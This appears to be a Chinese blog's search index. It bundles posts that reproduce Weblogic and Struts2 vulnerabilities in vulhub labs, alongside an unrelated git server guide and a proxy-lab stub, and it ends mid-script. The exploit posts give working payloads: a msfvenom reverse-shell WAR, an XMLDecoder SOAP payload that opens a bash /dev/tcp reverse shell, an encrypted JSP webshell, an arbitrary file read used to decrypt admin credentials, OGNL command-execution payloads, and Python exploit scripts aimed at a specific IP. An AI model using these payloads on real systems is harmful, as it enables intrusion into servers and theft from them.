<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Weblogic漏洞复现合集</title>
      <link href="/2022/04/26/Weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/"/>
      <url>/2022/04/26/Weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>Weblogic是一个基于JAVAEE架构的中间件，用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。<br>此文根据vulhub靶场环境进行漏洞复现。</p><h2 id="框架识别"><a href="#框架识别" class="headerlink" title="框架识别"></a>框架识别</h2><ul><li>默认的<code>7001</code>端口号，访问时会显示404状态码</li></ul><h2 id="识别版本"><a href="#识别版本" class="headerlink" title="识别版本"></a>识别版本</h2><ul><li>比较老的办法是访问控制台登录界面<code>url:7001/console/login/LoginForm.jsp</code>，页面的底部会显示版本号信息。当然该界面可能会被删除或禁止访问。</li><li>另一种方法是抓包，返回的协议报文中会带有Weblogic版本信息。<ul><li>工作原理<br>我们只需要发送<code>t3 10.3.6nAS:255nHL:19nn</code>数据给服务器，服务器会自动返回版本信息。</li><li>注意点<ul><li>如果只返回一个HELLO，这说明t3协议是开启的，需要多次提交探测包，才可能在某一次成功时获取到。</li><li>如果未探测到可能有以下几种请求：<ul><li>t3协议未启用</li><li>服务器做了负载均衡</li></ul></li><li>t3只支持HTTP协议，如果目标是HTTPS协议则需要t3s协议。</li></ul></li></ul></li></ul><h1 id="weak-password"><a href="#weak-password" class="headerlink" title="weak password"></a>weak password</h1><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>人为因素未修改系统默认密码，导致可以登录管理后台。另一个是因为存在任意文件读取命令，可以读取Weblogic默认目录下面管理员加密后的密码，以及用来进行加密的密钥。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>各个版本都会影响，大部分以10.3.6.0版本为例。</p><h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><p>进入<code>/console/login/LoginForm.jsp</code>后台登录界面，尝试弱口令登录</p><blockquote><p>用户名：weblogic<br>密码：Oracle@123</p></blockquote><p>登录成功，在右侧的菜单栏中选择部署，然后将包含shell的war包上传后部署在<code>/root/Oracle/Middleware/user_projects/domains/base_domain/autodeploy</code>目录下。<br>上面在上传的同时可以以Web应用的格式进行部署。<br>用msfvenom生成一个反向shell<br><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=ip LPORT=18050 SHELL=/bin/bash -o shell.jsp </code><br><code>jar -cvf shell.war shell.jsp</code>进行打包<br>对反弹的端口进行监听（可以使用msf自带的模块，也可以使用nc），之后访问上传的文件<code>curl http://url/shell/shell.jsp</code>便可以成功反弹shell。</p><h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h2><p>Weblogic默认错误输入5次密码后锁定账号，所以当弱密码漏洞不存在时，我们可以配合任意文件读取来GetShell。<br>Weblogic密码使用AES对称加密，知道密文和加密时的密钥便可以进行解密。<br>这两样东西均为于<code>base_domain</code>目录下。</p><ul><li><code>security/SerializedSystemIni.dat</code>存储密钥</li><li><code>config/config.xml</code>存储加密后的管理员密码，因为该文件是<code>base_domain</code>的全局配置文件，所以信息可能很多。我们需要的是<code>&lt;node-manager-password-encrypted&gt;</code>字段的值。</li></ul><p>在<code>hello/file.jsp/path=/etc/passwd</code>下存在任意文件包含漏洞，我们接下来读取上面的两个文件。<br>存储密钥的文件内容是二进制形式，我们使用curl读取后保存到key文件内。<br><code>curl http://ip:port/hello/file.jsp?path=security/SerializedSystemIni.dat &gt; key</code><br><code>curl http://ip:port/hello/file.jsp?path=config/config.xml &gt; config </code>读取配置文件，并找到加密后的密码。<br>之后对密码进行解密，结果为<code>Oracle@123</code>，与之前登录时的弱密码一样。<br>解密工具<a href="https://github.com/yuxiaoyou123/weblogic-Decryptor">地址</a>。</p><div class="note info red flat"><p>该工具在kali运行可能会缺少依赖的jar包，windows运行没有问题</p></div><p><code>&lt;node-manager-username&gt;</code>标签保存着用户名，接下来使用weblogic用户名和破解的密码登录即可。</p><h1 id="XMLDecoder反序列化漏洞（CVE-2017-3506）"><a href="#XMLDecoder反序列化漏洞（CVE-2017-3506）" class="headerlink" title="XMLDecoder反序列化漏洞（CVE-2017-3506）"></a>XMLDecoder反序列化漏洞（CVE-2017-3506）</h1><h2 id="漏洞成因-1"><a href="#漏洞成因-1" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>Weblogic Server WLS 组件在调用XMLDecoder进行解析XML数据时，触发反序列化漏洞进而造成远程命令执行，并且没有对输入的数据进行任何的过滤。<br>漏洞的触发点：wls-wsat.war这个Web应用下</p><p>该组件包括的路径：</p><blockquote><p>/wls-wsat/CoordinatorPortType<br>/wls-wsat/RegistrationPortTypeRPC<br>/wls-wsat/ParticipantPortType<br>/wls-wsat/RegistrationRequesterPortType<br>/wls-wsat/CoordinatorPortType11<br>/wls-wsat/RegistrationPortTypeRPC11<br>/wls-wsat/ParticipantPortType11<br>/wls-wsat/RegistrationRequesterPortType11<br>上面的路径都可以用来上传XML恶意数据。</p></blockquote><h2 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h2><p>Weblogic 10.3.6.0, 12.1.3.0, 12.2.1.0, 12.2.1.1 和 12.2.1.2。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>利用方式：通过构造SOAP(XML)格式的请求，在POST请求体中提交恶意XML数据，造成解析过程中XMLDecoder的反序列化漏洞。</p><p>这些目录定义在<code>web.xml</code>配置文件中，Windows下该文件的路径：<code>C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\wls-wsat\54p17w\war\WEB-INF</code><br>Linux在home目录下开始<br>我们在XML中设置将shell上传到<code>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/</code>或<code>servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/</code><br>这两个路径根据Weblogic版本的不同而变化，可以同时存在。<br>EXP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span><br><span class="line">&lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;java&gt;</span><br><span class="line">&lt;object class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">&lt;void index=&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/ip/port 0&amp;gt;&amp;amp;1&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method=&quot;start&quot;/&gt;</span><br><span class="line">&lt;/object&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure><p>上面反弹部分代码中的特殊字符必须要进行编码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span><br><span class="line">&lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;java&gt;&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">&lt;object class=&quot;java.io.PrintWriter&quot;&gt; </span><br><span class="line">&lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/wtf.jsp&lt;/string&gt;</span><br><span class="line">&lt;void method=&quot;println&quot;&gt;</span><br><span class="line">&lt;string&gt;</span><br><span class="line">&lt;![CDATA[</span><br><span class="line">&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k=&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;</span><br><span class="line">]]&gt;</span><br><span class="line">&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void method=&quot;close&quot;/&gt;</span><br><span class="line">&lt;/object&gt;&lt;/java&gt;&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure><p>我们使用对通话进行加密的冰蝎马来进行利用。<br>上面的key为<code>e45e329feb5d925b</code>，url路径为<code>/wls-wsat/wtf.jsp</code>或者<code>/bea_wls_internal/wtf.jsp</code>，默认密码为<code>rebeyond</code>。密钥是根据密码的md5值计算出来的。<br><img src="https://s2.loli.net/2022/04/28/pxZSKdRzHrt5L1k.png" alt="image.png"><br><img src="https://s2.loli.net/2022/04/28/YWESehb1xD8IPaT.png" alt="image.png"><br>可以发现上面的两个路径均可以上传，对应的访问路径不同。</p><h2 id="漏洞后续"><a href="#漏洞后续" class="headerlink" title="漏洞后续"></a>漏洞后续</h2><p>对于这个漏洞官方的解决办法仅仅是过滤了<code>object</code>标签，但是我们可以使用其它的标签来代替，比如array或者void等标签。<br>这也正是<code>CVE-2017-10271</code>漏洞的产生原因，上面的exp同样适用于<code>CVE-2017-10271</code>。<br>对于<code>CVE-2017-10271</code>，官方这次将所有的特殊标签均过滤掉了，暂时还没有安全问题。</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.xiaohongyan.cn/articles/2021/07/12/1626073473011.html#toc_h3_44">https://www.xiaohongyan.cn/articles/2021/07/12/1626073473011.html#toc_h3_44</a><br><a href="https://www.freebuf.com/vuls/278228.html">https://www.freebuf.com/vuls/278228.html</a><br><a href="https://www.freebuf.com/vuls/243985.html">https://www.freebuf.com/vuls/243985.html</a><br><a href="https://cloud.tencent.com/developer/article/1861375">https://cloud.tencent.com/developer/article/1861375</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
          <category> Weblogic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Weblogic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gitServer使用说明</title>
      <link href="/2022/04/25/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E5%AE%9E%E9%AA%8C%E5%AE%A4GIT%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/"/>
      <url>/2022/04/25/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E5%AE%9E%E9%AA%8C%E5%AE%A4GIT%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/</url>
      
        <content type="html"><![CDATA[<h1>网络工程实验室GIT服务器使用说明</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文主要介绍将本地代码提交到远程git服务器的方法，包括HTTP/s协议和SSH协议两种办法，推荐使用SSH协议进行提交。</p><h1 id="域名设置"><a href="#域名设置" class="headerlink" title="域名设置"></a>域名设置</h1><p>为了方便访问，我们将域名与IP地址对应起来。<br>Windows在<code>C:\WINDOWS\system32\drivers\etc\hosts</code>文件下添加如下的一行数据。</p><p><code>192.168.1.66 nciaewlgc.com</code></p><p>注意中间的空格必须要存在。<br>Linux在<code>/etc/hosts</code>文件中添加如上的数据即可。<br>添加完成后在浏览器中就可以通过<code>nciaewlgc.com:3000</code>进行访问。</p><h1 id="HTTP-s"><a href="#HTTP-s" class="headerlink" title="HTTP/s"></a>HTTP/s</h1><p>这种方法很简单，只需要使用<code>git remote add 名字(随便写) 仓库中的HTTP地址</code>添加一个远程地址。</p><p><img src="https://s2.loli.net/2022/04/25/voUteznRkpKiq67.png" alt="image.png"></p><p>然后使用<code>git push -u 上一步输入的名字</code>上传到远程仓库。<br>之后需要输入平台注册的用户和密码。<br>为了避免每次输入账号和密码，我们可以配置下面的SSH方式   。</p><h1 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h1><p>这种方法稍微复杂点，这里会将每步详细地介绍一下。<br>首先我们需要在本地主机生成一对公钥和密钥。<br>使用<code>ssh-keygen</code>命令生成，之后进行如下的步骤。<br><img src="https://s2.loli.net/2022/04/25/NyTczHmBWU1o5MJ.png" alt="image.png"></p><ol><li>输入密钥和公钥的保存位置及文件名</li><li>输入用来验证的密码</li><li>确认密码</li><li>密钥的保存位置及文件名，这里保存到了F盘，文件名为key</li><li>公钥的保存位置及文件名</li></ol><p>如果本地没有仓库或者个人的密钥，那么则无权限使用该方法克隆仓库到本地。</p><h2 id="公钥配置"><a href="#公钥配置" class="headerlink" title="公钥配置"></a>公钥配置</h2><p>公钥放在git服务器上面，配置比较简单。<br><img src="https://s2.loli.net/2022/04/25/qexNfFbQgRZouMa.png" alt="image.png"><br>进入个人设置界面，进入<code>SSH/GPG密钥</code>选项卡下，点击增加密钥，之后在输入框中粘贴上面公钥文件<code>key.pub</code>中的内容，最后保存便设置成功。</p><h2 id="密钥配置"><a href="#密钥配置" class="headerlink" title="密钥配置"></a>密钥配置</h2><p>为了避免与本地默认的 密钥文件<code>id_rsa</code>冲突，我们在这里为git服务器单独设置密钥。<br>Windows下在<code>C:\Users\Windows用户名\.ssh\config</code>文件中添加如下内容，Linux在<code>~/.ssh/config</code>文件中添加。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">    HostName github.com</span><br><span class="line">    IdentityFile `密钥文件的绝对路径包括文件名`</span><br><span class="line">    User git</span><br></pre></td></tr></table></figure><p>上面的服务器<code>github.com</code>如果是IP地址不需要加端口号 ，这里改为我们的服务器域名<code>nciaewlgc.com</code>。<br>配置完成后使用<code>git remote add 名字 仓库中的SSH地址</code>添加远程仓库。<br>提交到远程的方式与HTTP相同，如果设置了密码还需要输入密码（这个密码在输入时默认不会显示出来）。<br>该配置对于所有仓库来说只需要进行一次。</p><h1 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h1><p>详细简明的git操作可以参考这个<a href="https://www.liaoxuefeng.com/wiki/896043488029600">链接</a></p><h1 id="配置问题"><a href="#配置问题" class="headerlink" title="配置问题"></a>配置问题</h1><p>如果ssh要监听多个端口则需要对/etc/ssh/sshd_config进行修改，添加多个监听端口。<br>为什么SSH 2222端口本地可以访问外部不可以，监听端口却根本就不会收到数据包。<br>并没有真正的转发端口，本地访问的还是loopback接口</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP-ProxyLab</title>
      <link href="/2022/04/23/CSAPP-ProxyLab/"/>
      <url>/2022/04/23/CSAPP-ProxyLab/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>该实验的最终目的是写一个代理服务器用来缓存客户端请求的响应。<br>第一部分：</p><ul><li>创建一个代理服务器接收连接请求</li><li>读取并解析请求</li><li>转发请求到对应的WEB服务器</li><li>读取WEB服务器的响应</li><li>转发响应到对应的客户端</li></ul><p>第二部分：</p><ul><li>使服务器支持多并发连接</li></ul><p>第三部分</p><ul><li>为代理服务器添加缓存，使用主存用来缓存最近访问的WEB内容</li></ul><h1 id="第一部分：实现一个顺序型代理服务器"><a href="#第一部分：实现一个顺序型代理服务器" class="headerlink" title="第一部分：实现一个顺序型代理服务器"></a>第一部分：实现一个顺序型代理服务器</h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Struts2漏洞复现合集</title>
      <link href="/2022/04/22/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/"/>
      <url>/2022/04/22/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>Apache Struts2是一个基于MVC设计模式的WEB应用框架，类似于python中的Django框架。</p><h2 id="框架的识别"><a href="#框架的识别" class="headerlink" title="框架的识别"></a>框架的识别</h2><ul><li>通过网页的后缀来进行判断，<code>.do</code>或<code>.action</code>（补充：开发者可以修改URL映射关系从而不显示后缀）</li><li>通过访问一些action路径查看报错信息：<ul><li><code>url+/?actionErrors=1111</code></li><li><code>url+/?tmp2017.action</code></li><li><code>url+/?tmp2017.do</code></li><li><code>url+/?system/index!testme.action</code></li><li><code>url+/?system/index!testme.do</code></li><li>报错信息<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> [&#x27;Struts Problem Report&#x27;,&#x27;org.apache.struts2&#x27;,&#x27;struts.devMode&#x27;,&#x27;struts-tags&#x27;,</span><br><span class="line">&#x27;There is no Action mapped for namespace&#x27;]</span><br></pre></td></tr></table></figure></li></ul></li><li>访问一个不存在的路径然后查看服务器提示信息来判断（可能返回容器默认的错误界面）</li><li>该框架一些特殊的路径<ul><li><code>url+&quot;/struts/webconsole.html&quot;</code>一个后台界面</li></ul></li><li>通过<code>CheckboxInterceptor</code>，原理是struts2的CheckBoxInterceptor拦截器会判断请求中的参数是否以<code>__checkbox_</code>开头。</li><li>更多的信息可以看这个<a href="https://github.com/coffeehb/struts2_check/blob/aad59d1678162a8f0b8ed26da829439b8eafedaa/struts2_hunt_v2.py#L16">识别工具</a></li></ul><h1 id="S2-001"><a href="#S2-001" class="headerlink" title="S2-001"></a>S2-001</h1><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>用户提交表单数据并且验证失败后，后端会将用户提交的表单数据使用OGNL表达式<code>%&#123;value&#125;</code>进行解析，然后重新填充到对应的表单中。比如注册和登录界面，验证失败后会默认返回之前提交的数据。<br>这样，利用后端对提交的数据进行一次OGNL表达式解析，我们可以构造payload达到命令执行的目的。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.0-2.0.8</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>验证漏洞是否存在：<br>存在一个表单提交框<br><img src="https://s2.loli.net/2022/04/22/o9jGYFqMdP8xL1k.png" alt="image.png"><br>提交包含OGNL的表达式，来看看后端会不会解析<br><img src="https://s2.loli.net/2022/04/22/BePvO8NU6x7t3Sc.png" alt="image.png"><br>成功解析了我们的OGNL表达式，证明漏洞存在。<br><img src="https://s2.loli.net/2022/04/22/ZA89uGPRYmIBwjW.png" alt="image.png"><br>构造POC脚本：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    url = <span class="string">&quot;&quot;</span> </span><br><span class="line">    username = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    %&#123;</span></span><br><span class="line"><span class="string">        #a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;,&quot;/etc/passwd&quot;&#125;)).redirectErrorStream(true).start(),</span></span><br><span class="line"><span class="string">        #b=#a.getInputStream(),</span></span><br><span class="line"><span class="string">        #c=new java.io.InputStreamReader(#b),</span></span><br><span class="line"><span class="string">        #d=new java.io.BufferedReader(#c),</span></span><br><span class="line"><span class="string">        #e=new char[50000],</span></span><br><span class="line"><span class="string">        #d.read(#e),</span></span><br><span class="line"><span class="string">        #f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),</span></span><br><span class="line"><span class="string">        #f.getWriter().println(new java.lang.String(#e)),</span></span><br><span class="line"><span class="string">        #f.getWriter().flush(),</span></span><br><span class="line"><span class="string">        #f.getWriter().close()</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    password = <span class="string">&quot;hello&quot;</span></span><br><span class="line">    data = &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: password&#125;</span><br><span class="line">    req = requests.post(url, data=data)</span><br><span class="line">    <span class="built_in">print</span>(req.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><p>其中执行的命令可以更改。</p><h1 id="S2-005"><a href="#S2-005" class="headerlink" title="S2-005"></a>S2-005</h1><h2 id="漏洞成因-1"><a href="#漏洞成因-1" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>Struts2会将http请求中的每个参数名解析为OGNL语句执行。<br>OGNL表达式通过<code>#</code>符号来访问struts的对象，struts2通过过滤#字符防止安全问题，但是通过Unicode编码(\u0023)或八进制(\43)可以绕过安全限制。<br>对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是攻击者可以利用OGNL表达式将这2个选项打开，从而绕过安全配置。</p><h2 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts2 &lt; 2.0.12 </p><h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>将<code>http://42.192.56.33:18080/example/HelloWorld.action?param</code>中的param请求参数替换为我们的payload。<br>payload中的<code>#</code>符号进行Unicode编码，url中的特殊字符进行url编码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#x27;#_memberAccess[\&#x27;allowStaticMethodAccess\&#x27;]&#x27;)(vaaa)=true&amp;(aaaa)((&#x27;#context[\&#x27;xwork.MethodAccessor.denyMethodExecution\&#x27;]=#vccc&#x27;)(#vccc=new java.lang.Boolean(&quot;false&quot;)))&amp;(asdf)((&#x27;#rt.exec(&quot;touch@/tmp/wtf&quot;.split(&quot;@&quot;))&#x27;)(#rt=@java.lang.Runtime@getRuntime()))=1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#x27;\u0023_memberAccess[\&#x27;allowStaticMethodAccess\&#x27;]&#x27;)(vaaa)=true&amp;(aaaa)((&#x27;\u0023context[\&#x27;xwork.MethodAccessor.denyMethodExecution\&#x27;]\u003d\u0023vccc&#x27;)(\u0023vccc\u003dnew java.lang.Boolean(&quot;false&quot;)))&amp;(asdf)((&#x27;\u0023rt.exec(&quot;touch@/tmp/wtf&quot;.split(&quot;@&quot;))&#x27;)(\u0023rt\u003d@java.lang.Runtime@getRuntime()))=1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#x27;%5Cu0023_memberAccess%5B%5C&#x27;allowStaticMethodAccess%5C&#x27;%5D&#x27;)(vaaa)=true&amp;(aaaa)((&#x27;%5Cu0023context%5B%5C&#x27;xwork.MethodAccessor.denyMethodExecution%5C&#x27;%5D%5Cu003d%5Cu0023vccc&#x27;)(%5Cu0023vccc%5Cu003dnew%20java.lang.Boolean(%22false%22)))&amp;(asdf)((&#x27;%5Cu0023rt.exec(%22touch@/tmp/wtf%22.split(%22@%22))&#x27;)(%5Cu0023rt%5Cu003d@java.lang.Runtime@getRuntime()))=1</span><br></pre></td></tr></table></figure><h1 id="S2-007"><a href="#S2-007" class="headerlink" title="S2-007"></a>S2-007</h1><h2 id="漏洞成因-2"><a href="#漏洞成因-2" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>漏洞的根本原因也是因为将用户输入进行了OGNL表达式解析。<br>进行解析的触发条件是，当传递的数据出现类型转换错误时。</p><h2 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts2 2.0.0-2.2.3</p><h2 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><img src="https://s2.loli.net/2022/04/23/bfnpUxmi6Zc4Sqd.png" alt="image.png"><br>可以看到age字段不支持字符串格式的数据，那么这样的类型转换错误就会进行OGNL表达式解析。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;whoami&#x27;).getInputStream())) + &#x27;</span><br></pre></td></tr></table></figure><p>该POC可以直接在浏览器中发送，如果要抓包发送则需要对特殊字符进行URL编码。<br>python脚本：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    url = <span class="string">&quot;http://42.192.56.33:18080/user.action&quot;</span></span><br><span class="line">    name = <span class="string">&quot;1&quot;</span></span><br><span class="line">    email = <span class="string">&quot;1&quot;</span></span><br><span class="line">    age = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &#x27; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&quot;ls&quot;).getInputStream())) + &#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    cookies = &#123;<span class="string">&quot;jsessionid&quot;</span>: <span 